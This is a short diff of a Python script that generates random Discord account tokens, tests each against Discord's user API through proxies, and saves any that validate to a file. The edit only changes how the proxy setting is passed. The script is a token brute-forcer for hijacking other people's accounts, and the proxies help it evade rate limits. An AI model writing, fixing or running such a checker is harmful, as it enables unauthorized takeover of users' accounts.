@@ -35,7 +35,7 @@ def checker():
         b = "".join(random.choice(chars) for x in range(6))
         c = "".join(random.choice(chars) for x in range(27))
         token = "OTIw" + a + "." + b + "." + c
-        r=session.get('https://discord.com/api/v9/users/@me',headers={"Authorization": token},proxies=proxy)
+        r=session.get('https://discord.com/api/v9/users/@me',headers={"Authorization": token},proxies={    'http': proxy    })
         if r.status_code == 200:
             print(f"{Fore.GREEN}  Valid {Fore.CYAN}| {Fore.RESET}{token}")
             file = open('valid.txt', 'w')
